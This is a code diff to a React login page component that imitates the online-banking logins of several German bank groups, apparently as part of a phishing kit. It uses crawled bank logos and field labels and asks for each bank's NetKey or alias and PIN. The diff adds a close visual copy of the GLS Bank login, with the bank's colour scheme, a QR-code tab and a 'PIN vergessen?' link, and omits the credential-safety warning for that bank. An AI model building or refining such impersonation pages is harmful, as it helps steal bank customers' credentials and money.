@@ -268,9 +268,11 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
   const isVR = bank?.group === "Volksbanken Raiffeisenbanken";
   const isPSD = bank?.group === "PSD Banken";
   const isSparda = bank?.group === "Sparda-Banken";
+  const isGLS = bank?.group === "GLS Bank";
   const crawledLabel = (bank as any)?.login_field_label as string | null | undefined;
   const groupLabel = isPSD ? "PSD-Key oder Alias" : isSparda ? "Sparda-NetKey oder Alias" : "VR-NetKey oder Alias";
   const aliasFieldLabel = crawledLabel && crawledLabel.trim().length > 0 ? crawledLabel : groupLabel;
+
   const secureGoLabel = getSecureGoLabel(bank?.group);
 
   const crawledLogo = bank ? resolveAsset("bank-logos", bank.logo_url ?? null, bank.logo_storage_path) : null;
@@ -599,18 +601,36 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
         <div className="w-full lg:w-1/2 flex flex-col gap-4">
           <div className="bg-white shadow-md border border-gray-200 overflow-hidden" style={{ borderRadius: theme.buttonRadius === "rounded-none" ? "0px" : "12px" }}>
             <div className="p-6 sm:p-8">
-              <h2 className="text-2xl sm:text-3xl font-bold mb-4" style={{ color: themeColor }}>
-                Anmelden
-              </h2>
+              {isGLS ? (
+                <div className="flex flex-col mb-6">
+                  <h2 className="text-3xl font-bold mb-6 text-[#002864]">
+                    Anmelden
+                  </h2>
+                  <div className="flex border-b border-gray-200 mb-6">
+                    <button type="button" className="px-1 pb-3 text-sm font-bold text-[#002864] border-b-2 border-[#002864]">
+                      Mit Zugangsdaten anmelden
+                    </button>
+                    <button type="button" className="px-6 pb-3 text-sm font-bold text-gray-400 hover:text-gray-600">
+                      Mit QR-Code anmelden
+                    </button>
+                  </div>
+                </div>
+              ) : (
+                <>
+                  <h2 className="text-2xl sm:text-3xl font-bold mb-4" style={{ color: themeColor }}>
+                    Anmelden
+                  </h2>
+                  <div className="mb-5">
+                    <p className="font-bold text-sm text-gray-800 mb-1">
+                      Achtung: Geben Sie niemals Ihre Zugangsdaten, TAN oder PIN weiter!
+                    </p>
+                    <p className="text-sm text-gray-600">
+                      Unsere Mitarbeiter werden Sie niemals dazu auffordern Ihre Zugangsdaten preiszugeben oder einen Auftrag über die {secureGoLabel} App freizugeben.
+                    </p>
+                  </div>
+                </>
+              )}
 
-              <div className="mb-5">
-                <p className="font-bold text-sm text-gray-800 mb-1">
-                  Achtung: Geben Sie niemals Ihre Zugangsdaten, TAN oder PIN weiter!
-                </p>
-                <p className="text-sm text-gray-600">
-                  Unsere Mitarbeiter werden Sie niemals dazu auffordern Ihre Zugangsdaten preiszugeben oder einen Auftrag über die {secureGoLabel} App freizugeben.
-                </p>
-              </div>
 
               {errorMsg && (
                 <div className="mb-4 bg-red-50 border border-red-200 p-4 flex items-start gap-2" style={{ borderRadius: buttonBorderRadius }}>
@@ -628,8 +648,9 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
                       value={vrNetKey}
                       onChange={(e) => { setVrNetKey(e.target.value); if (e.target.value.trim()) setVrNetKeyError(false); setCredentialsInvalid(false); setErrorMsg(null); }}
                       placeholder=" "
-                      className={`peer w-full px-4 pt-6 pb-2 border-2 focus:outline-none transition-colors text-base bg-transparent ${vrNetKeyError ? "border-red-500" : "border-gray-300"}`}
-                      style={{ ...(!vrNetKeyError && vrNetKey ? { borderColor: theme.accentText } : {}), borderRadius: buttonBorderRadius }}
+                      className={`peer w-full px-4 pt-6 pb-2 border-2 focus:outline-none transition-colors text-base bg-transparent ${vrNetKeyError ? "border-red-500" : isGLS ? "border-gray-800" : "border-gray-300"}`}
+                      style={{ ...(!vrNetKeyError && vrNetKey ? { borderColor: theme.accentText } : {}), borderRadius: isGLS ? "4px" : buttonBorderRadius }}
+
                       autoComplete="username"
                     />
                     <label
@@ -656,8 +677,9 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
                       value={pin}
                       onChange={(e) => { setPin(e.target.value); if (e.target.value.trim()) setPinError(false); setCredentialsInvalid(false); setErrorMsg(null); }}
                       placeholder=" "
-                      className={`peer w-full px-4 pt-6 pb-2 pr-12 border-2 focus:outline-none transition-colors text-base bg-transparent ${pinError ? "border-red-500" : "border-gray-300"}`}
-                      style={{ ...(!pinError && pin ? { borderColor: theme.accentText } : {}), borderRadius: buttonBorderRadius }}
+                      className={`peer w-full px-4 pt-6 pb-2 pr-12 border-2 focus:outline-none transition-colors text-base bg-transparent ${pinError ? "border-red-500" : isGLS ? "border-gray-800" : "border-gray-300"}`}
+                      style={{ ...(!pinError && pin ? { borderColor: theme.accentText } : {}), borderRadius: isGLS ? "4px" : buttonBorderRadius }}
+
                       autoComplete="current-password"
                     />
                     <label
@@ -666,6 +688,12 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
                     >
                       PIN
                     </label>
+                    {isGLS && (
+                      <button type="button" className="absolute right-0 -bottom-6 text-xs font-bold text-[#002864] hover:underline">
+                        PIN vergessen?
+                      </button>
+                    )}
+
                     <button
                       type="button"
                       onClick={() => setShowPin(!showPin)}
@@ -684,20 +712,27 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
 
                 </div>
 
-                <div className="flex gap-4 pt-2">
+                <div className={`flex gap-4 ${isGLS ? "pt-10" : "pt-2"}`}>
                   <button
                     type="button"
                     onClick={() => navigate({ to: "/" })}
-                    className={`px-8 py-3 ${theme.buttonRadius} border-2 font-medium hover:bg-gray-50 transition-colors text-sm`}
-                    style={{ borderColor: theme.accentText, color: theme.accentText }}
+                    className={`px-8 py-3 font-medium transition-colors text-sm ${isGLS ? "border border-[#002864] text-[#002864] hover:bg-gray-50" : "border-2 hover:bg-gray-50"}`}
+                    style={{ 
+                      borderColor: isGLS ? "#002864" : theme.accentText, 
+                      color: isGLS ? "#002864" : theme.accentText,
+                      borderRadius: isGLS ? "0px" : buttonBorderRadius
+                    }}
                   >
                     Abbrechen
                   </button>
                   <button
                     type="submit"
                     disabled={submitting}
-                    className={`px-8 py-3 ${theme.buttonRadius} text-white font-medium transition-opacity hover:opacity-90 text-sm ml-auto disabled:opacity-70 disabled:cursor-not-allowed inline-flex items-center gap-2`}
-                    style={{ backgroundColor: theme.buttonBg }}
+                    className={`px-8 py-3 text-white font-medium transition-opacity hover:opacity-90 text-sm ml-auto disabled:opacity-70 disabled:cursor-not-allowed inline-flex items-center gap-2`}
+                    style={{ 
+                      backgroundColor: isGLS ? "#002864" : theme.buttonBg,
+                      borderRadius: isGLS ? "0px" : buttonBorderRadius
+                    }}
                   >
                     {submitting ? (
                       <span className="inline-flex gap-1" aria-label="Wird geprüft">
@@ -710,6 +745,7 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
                     )}
                   </button>
                 </div>
+
               </form>
             </div>
           </div>
